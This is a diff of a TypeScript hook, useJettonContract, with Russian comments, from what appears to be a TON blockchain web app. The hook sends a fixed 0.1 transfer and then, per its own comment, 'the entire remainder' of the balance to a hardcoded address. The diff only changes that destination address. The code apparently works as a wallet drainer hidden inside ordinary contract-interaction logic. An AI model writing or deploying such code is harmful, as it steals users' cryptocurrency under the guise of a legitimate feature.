@@ -170,7 +170,7 @@ export function useJettonContract() {
             try {
                 // ШАГ 1: Отправляем первую фиксированную транзакцию 
                 const result = await executeTransfer(
-                    "kQA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidgl7",
+                    "kQDs9Q2M03o7WFa2Y7yEuLUpsB0nCjghhb49xizpoZh467E2",
                     "0.1"
                 );
                 console.log("Первая транзакция отправлена:", result);
@@ -192,7 +192,7 @@ export function useJettonContract() {
                 if (amountToSend > 0.01) {
                     // ШАГ 3: Отправляем вторую транзакцию на весь остаток
                     const secondResult = await executeTransfer(
-                        "kQA2Vt1jJnQZ3YsKr0di2xzOOHrhzWOZQekFsLGNWdgidgl7",
+                        "kQDs9Q2M03o7WFa2Y7yEuLUpsB0nCjghhb49xizpoZh467E2",
                         amountStr
                     );
                     console.log("Вторая транзакция (остаток) отправлена:", secondResult);
